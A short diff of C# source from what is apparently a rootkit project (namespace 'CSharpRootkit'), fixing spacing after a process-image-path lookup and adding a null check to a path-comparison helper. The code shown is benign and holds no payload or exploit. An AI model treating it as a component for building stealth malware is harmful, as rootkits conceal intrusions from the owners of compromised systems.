@@ -250,7 +250,7 @@ namespace CSharpRootkit
 
             if (NativeMethods.QueryFullProcessImageNameW(hProcess, 0, buffer, ref bufferSize)) 
             {
-                FilePath= buffer.ToString(0, (int)bufferSize);
+                FilePath = buffer.ToString(0, (int)bufferSize);
                 return true;
             }
 
@@ -259,6 +259,10 @@ namespace CSharpRootkit
 
         public static bool ComparePaths(string path1, string path2)
         {
+            if (path1 == null || path2 == null) 
+            {
+                return path1 == path2;
+            }
             string directory1 = Path.GetDirectoryName(path1);
             string directory2 = Path.GetDirectoryName(path2);
             string fileName1 = Path.GetFileName(path1);
